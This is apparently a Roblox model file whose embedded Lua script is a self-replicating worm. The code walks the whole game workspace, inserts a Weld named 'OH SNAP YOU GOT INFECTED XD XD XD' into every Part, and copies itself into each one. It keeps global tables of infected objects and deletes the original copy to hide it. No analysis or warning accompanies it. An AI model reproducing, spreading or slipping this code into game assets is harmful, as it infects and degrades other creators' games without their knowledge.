							<string name="Source">if script:findFirstChild(&quot;vic&quot;) == nil then
	local count = Instance.new(&quot;NumberValue&quot;)
	count.Parent = script
	count.Name = &quot;vic&quot;
	count.Value = 1
end
if numberwormed == nil then
	_G.numberwormed = script.vic.Value
end
script.vic.Value = numberwormed
if wormmed == nil then
	_G.wormmed = {}
end
if requestworm == nil then
	_G.requestworm = function (obj)
		local ok = false
		for i=1, #wormmed do
			if obj == wormmed[i] then
				ok = true
			end
		end
		return ok
	end
end
if addwormmed == nil then
	_G.addwormmed = function (obj)
		table.insert(wormmed, obj)
	end
end

classes = {&quot;Snap&quot;, &quot;Weld&quot;}

function checkParent()
	local ok = false
	for i=1, #classes do
		if script.Parent.className == classes[i] then
			ok = true
		end
	end
	return ok
end

function checkScriptIsMe(scr)
	if scr.className == &quot;Script&quot; then
		if scr.Source == script.Source then
			return true
		end
	end
	return false
end

function checkPart(part)
	local ok = false
	local c = part:GetChildren()
	for i=1, #c do
		if c[i].className == &quot;Weld&quot; then
			local b = c[i]:GetChildren()
			for z=1, #b do
				if checkScriptIsMe(b[z]) then
					ok = true
				end
			end
		end
	end
	return ok
end

function cloneToBrick(part)
	if not checkPart(part) then
		local weld = Instance.new(&quot;Weld&quot;)
		weld.Parent = part
		weld.Name = &quot;OH SNAP YOU GOT INFECTED XD XD XD&quot;
		local new = script:clone()
		new.Parent = weld
	end
end

function worm(model)
	if requestworm(model) then return end
	addwormmed(model)
	local c = model:GetChildren()
	for i=1, #c do
		if c[i].className == &quot;Part&quot; then
			cloneToBrick(c[i])
		end
		worm(c[i])
	end
end
wait(math.random() / 4)
worm(workspace)

if not checkParent() then
	script:remove()
end </string>
